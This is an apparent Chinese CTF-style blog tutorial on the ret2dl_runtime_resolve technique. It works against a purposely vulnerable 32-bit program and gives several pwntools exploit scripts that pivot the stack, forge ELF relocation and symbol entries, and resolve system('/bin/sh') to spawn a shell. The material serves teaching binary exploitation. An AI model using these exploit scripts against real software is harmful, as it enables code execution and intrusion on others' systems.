---
title: "ret2dl_runtime_resolve"
description: "拖了超级超级久才学了 ret2dl ，学会后发现确实有点麻烦，可以考虑 ret2all 之类的打法"
pubDate: 2025-11-24
category: pwn
tags: [ret2dl]
---

## 前置

在学习 ret2libc 的时候，了解了延迟绑定（lazy binding）机制[^1]。

> 延迟绑定（lazy binding）：动态链接器用来减少程序启动时间的一种技术，在函数第一次被调用的时候再和函数地址绑定。

这个过程同样可以被劫持，让函数地址绑定成另一个函数。

## ret2dl_runtime_resolve[^2]

为方便阐述，笔者将在下文用 `ret2dl` 代替 `ret2dl_runtime_resolve` 。

虽然 32 位程序和 64 位程序在函数参数传递上存在差异，但笔者仅讲述其中一种情况的 `ret2dl`。

### 源码

```C
#include<stdio.h>

void vuln()
{
    char content[0x100];
    read(0, content, 0x200);
}

int main(){
    vuln();
    return 0;
}
```

编译命令：`gcc -m32 -o example example.c -no-pie -fno-stack-protector -w`

### 查看并伪造函数绑定过程

用 gdb 调试程序，断点打在 0x804918D ，也就是 read 函数被调用的位置，然后 __si__ , 发现程序会先跳转到 read 的 got 表内的地址，一开始应该是 read 的 plt 地址加 6 ，其内容如下

```
 ► 0x8049040  <read@plt>                  jmp    dword ptr [read@got[plt]]   <read@plt+6>
    ↓
   0x8049046  <read@plt+6>                push   8
   0x804904b  <read@plt+11>               jmp    0x8049020                   <0x8049020>
    ↓
   0x8049020                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+4]
   0x8049026                              jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+8] <_dl_runtime_resolve>
```

其过程为 `read@plt -> [read@got] = read@plt+6 -> push reloc_index -> push link_map -> _dl_runtime_resolve` ，该过程中的 reloc_index （上文中的 8 ）和 link_map （上文中的 dword ptr [\_GLOBAL_OFFSET_TABLE_+4]) 就是确定所绑定的函数信息的。那么这两个值的含义是什么呢，8 代表了绑定的函数信息在 `.rel.plt` 段对应的偏移。

以这个程序的 read 为例，0x080482FC-080482F4 的值就是 8

```
LOAD:080482F4 ; ELF JMPREL Relocation Table
LOAD:080482F4                 Elf32_Rel <804C000h, 107h> ; R_386_JMP_SLOT __libc_start_main
LOAD:080482FC                 Elf32_Rel <804C004h, 207h> ; R_386_JMP_SLOT read
```

#### 伪造 reloc_index

尝试伪造 reloc_index ，笔者打算用栈迁移的方法迁移栈到 .rel.plt 段之后伪造对应的结构体 ELF32_Rel，信息和上文填的一样就行，也就是 0x804C004 和 0x207 。

```python
from pwn import *

context.binary = elf = ELF('./example')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

libc = elf.libc

script = '''
b *0x804919A
'''
io = process(elf.path)
gdb.attach(io, script)

tar_stack = 0x804C800
vuln_skip_rbp = 0x8049169
leave_ret = 0x8049199
analyse_func = 0x8049020
analyse_func_no_push = 0x8049026

rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

offset = 0x108

payload = b'a' * offset
payload += p32(tar_stack-4)
payload += p32(elf.plt['read'])
payload += p32(leave_ret)
payload += p32(0)  # stdin
payload += p32(tar_stack)
payload += p32(0x600)  # size
io.sendline(payload)

pause()

reloc_index = tar_stack - rel_plt + 0x18

payload = p32(analyse_func)
payload += p32(reloc_index)
payload += p32(0xdeadbeef)  # fake return addr
payload += p32(0) + p32(tar_stack) + p32(0x200)
payload += p32(0x804C004) + p32(0x207)	# fake ELF32_Rel
io.sendline(payload)

io.interactive()
```

运行发现正确执行 read，可以交互进行读入。

#### 伪造 ELF32_Rel 结构体的值

```C
typedef struct{
  Elf32_Addr r_offset;
  Elf32_Word r_info;
}Elf32_Rel
```

第一个字段 r_offset 就是解析结果（函数真实地址）要写入的地址，正常为对应函数的 got 地址，伪造的话可以继续用也可以顺便找个可写地址。重点在于第二个字段 r_info ，上文中的值为 0x207。其中 r_info 的低 8 位是重定位的类型，而高 8 位的值是对应在 symbol table 中 的偏移。

```
LOAD:0804820C ; ELF Symbol Table
LOAD:0804820C                 Elf32_Sym <0>
LOAD:0804821C                 Elf32_Sym <offset aLibcStartMain - offset unk_804825C, 0, 0, 12h, 0, \ ; "__libc_start_main"
LOAD:0804821C                            0>
LOAD:0804822C                 Elf32_Sym <offset aRead - offset unk_804825C, 0, 0, 12h, 0, 0> ; "read"
LOAD:0804823C                 Elf32_Sym <offset aGmonStart - offset unk_804825C, 0, 0, 20h, 0, 0> ; "__gmon_start__"
LOAD:0804824C                 Elf32_Sym <offset aIoStdinUsed - offset unk_804825C, \ ; "_IO_stdin_used"
LOAD:0804824C                            offset _IO_stdin_used, 4, 11h, 0, 0Fh>
```

从 0 下标开始索引，2 对应的确实是 read 函数。与上面伪造 reloc_index 相同，也是把偏移填大一点，伪造的内容在栈迁移部分的后面。

```python
from pwn import *

context.binary = elf = ELF('./example')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

libc = elf.libc

script = '''
b *0x804919A
'''
io = process(elf.path)
gdb.attach(io, script)

tar_stack = 0x804C800
vuln_skip_rbp = 0x8049169
leave_ret = 0x8049199
analyse_func = 0x8049020
analyse_func_no_push = 0x8049026

rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

offset = 0x108

payload = b'a' * offset
payload += p32(tar_stack-4)
payload += p32(elf.plt['read'])
payload += p32(leave_ret)
payload += p32(0)  # stdin
payload += p32(tar_stack)
payload += p32(0x600)  # size
io.sendline(payload)

pause()

reloc_index = tar_stack - rel_plt + 0x18
r_info = (((tar_stack - dynsym + 0x2C) // 0x10) << 8) | 0x7
# (tar_stack - dynsym + 0x2C) % 0x10 == 0, "必须对齐"

payload = p32(analyse_func)
payload += p32(reloc_index)
payload += p32(0xdeadbeef)  # fake return addr
payload += p32(0) + p32(tar_stack) + p32(0x200)
payload += p32(0x804C004) + p32(r_info) #fake ELF32_Rel
payload += b'k'*12
payload += p32(0x10) + p32(0) + p32(0) + p8(0x12) + p8(0) + p16(0)  #fake ELF32_Sym
io.sendline(payload)

io.interactive()
```

#### 伪造 ELF32_Sym 结构体的值

```C
typedef struct
{
  Elf32_Word    st_name;
  Elf32_Addr    st_value;
  Elf32_Word    st_size;
  unsigned char st_info;
  unsigned char st_other;
  Elf32_Section st_shndx;
}Elf32_Sym;
```

在 symbol table 中，发现就 st_name 和 st_info 的值非零，那么零字段继续保持为零，不过多关注。st_name 是对应的函数名称字符串在 string table 中的偏移，而 st_info 字段则是高 4 位是绑定信息，低四位是符号类型信息。

```
LOAD:0804825C ; ELF String Table
LOAD:0804825C unk_804825C     db    0                 ; DATA XREF: LOAD:0804821C↑o
LOAD:0804825C                                         ; LOAD:0804822C↑o ...
LOAD:0804825D aIoStdinUsed    db '_IO_stdin_used',0   ; DATA XREF: LOAD:0804824C↑o
LOAD:0804826C aRead           db 'read',0             ; DATA XREF: LOAD:0804822C↑o
LOAD:08048271 aLibcStartMain  db '__libc_start_main',0
LOAD:08048271                                         ; DATA XREF: LOAD:0804821C↑o
LOAD:08048283 aLibcSo6        db 'libc.so.6',0        ; DATA XREF: LOAD:080482BC↓o
LOAD:0804828D aGlibc20        db 'GLIBC_2.0',0        ; DATA XREF: LOAD:080482CC↓o
LOAD:08048297 aGlibc234       db 'GLIBC_2.34',0       ; DATA XREF: LOAD:080482DC↓o
LOAD:080482A2 aGmonStart      db '__gmon_start__',0   ; DATA XREF: LOAD:0804823C↑o
LOAD:080482B1                 align 2
```

仅伪造 dt_name 就就好，

```python
from pwn import *

context.binary = elf = ELF('./example')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

libc = elf.libc

script = '''
b *0x804919A
'''
io = process(elf.path)
gdb.attach(io, script)

tar_stack = 0x804C800
vuln_skip_rbp = 0x8049169
leave_ret = 0x8049199
analyse_func = 0x8049020
analyse_func_no_push = 0x8049026

rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

offset = 0x108

payload = b'a' * offset
payload += p32(tar_stack-4)
payload += p32(elf.plt['read'])
payload += p32(leave_ret)
payload += p32(0)  # stdin
payload += p32(tar_stack)
payload += p32(0x600)  # size
io.sendline(payload)

# (tar_stack - dynsym + 0x2C) % 0x10 == 0
reloc_index = tar_stack - rel_plt + 0x18
r_info = (((tar_stack - dynsym + 0x2C) // 0x10) << 8) | 0x7
st_name = tar_stack - dynstr + 0x3C

pause()

payload = p32(analyse_func)
payload += p32(reloc_index)
payload += p32(0xdeadbeef)  # fake return addr
payload += p32(0) + p32(tar_stack) + p32(0x200)
payload += p32(0x804C004) + p32(r_info) #fake ELF32_Rel
payload += b'k'*12
payload += p32(st_name) + p32(0) + p32(0) + p8(0x12) + p8(0) + p16(0)  #fake ELF32_Sym
payload += b'read\0'

io.sendline(payload)

io.interactive()
```

#### 劫持成目标函数

了解了一遍绑定流程，发现最后是通过字符串去解析函数的，只要最后改成目标函数的字符串，就能触发目标函数。

下面给出一个劫持为 system 的例子

```python
from pwn import *

context.binary = elf = ELF('./example')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

libc = elf.libc

script = '''
b *0x804919A
'''
io = process(elf.path)
gdb.attach(io, script)

tar_stack = 0x804C800
vuln_skip_rbp = 0x8049169
leave_ret = 0x8049199
analyse_func = 0x8049020
analyse_func_no_push = 0x8049026

rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

offset = 0x108

payload = b'a' * offset
payload += p32(tar_stack-4)
payload += p32(elf.plt['read'])
payload += p32(leave_ret)
payload += p32(0)  # stdin
payload += p32(tar_stack)
payload += p32(0x600)  # size
io.sendline(payload)

# (tar_stack - dynsym + 0x2C) % 0x10 == 0
reloc_index = tar_stack - rel_plt + 0x18
r_info = (((tar_stack - dynsym + 0x2C) // 0x10) << 8) | 0x7
st_name = tar_stack - dynstr + 0x3C

pause()

sh_addr = tar_stack + 0x44

payload = p32(analyse_func)
payload += p32(reloc_index)
payload += p32(0xdeadbeef)  # fake return addr
payload += p32(sh_addr) + b'k'*8
payload += p32(0x804C004) + p32(r_info) #fake ELF32_Rel
payload += b'k'*12
payload += p32(st_name) + p32(0) + p32(0) + p8(0x12) + p8(0) + p16(0)  #fake ELF32_Sym
payload += b'system\0\0'
payload += b'/bin/sh\0'

io.sendline(payload)

io.interactive()
```

### 总述

ret2dl 的手法并不算难理解，主要的优点就是不依靠 libc 来执行任意函数。

64 位的情况就留给师傅们自己尝试吧，如果有疑问也可以联系我。

## 参考文献

[^1]: [延迟绑定](https://yjy123123.github.io/2021/12/06/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/)
[^2]: [ret2dlresolve小记](https://ltfa1l.top/2024/06/05/system/StackOverflow/ret2dlresolve/)
